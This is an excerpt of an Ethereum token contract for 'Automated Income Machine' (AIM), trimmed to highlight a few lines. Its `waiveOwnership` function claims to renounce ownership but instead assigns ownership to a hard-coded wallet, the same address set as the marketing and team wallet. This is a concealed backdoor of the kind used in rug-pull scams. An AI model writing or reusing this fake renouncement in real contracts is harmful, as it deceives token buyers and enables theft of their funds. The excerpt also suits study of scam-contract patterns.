...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x2f80a94b34Cb3b04920C41b2577cEEe078ad6fda);
    }
...
contract AutomatedIncomeMachine is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Automated Income Machine";
    string private _symbol = "AIM";
    uint8 private _decimals = 18;

    address payable public marketingWalletAddress = payable(0x2f80a94b34Cb3b04920C41b2577cEEe078ad6fda);
    address payable public teamWalletAddress = payable(0x2f80a94b34Cb3b04920C41b2577cEEe078ad6fda);
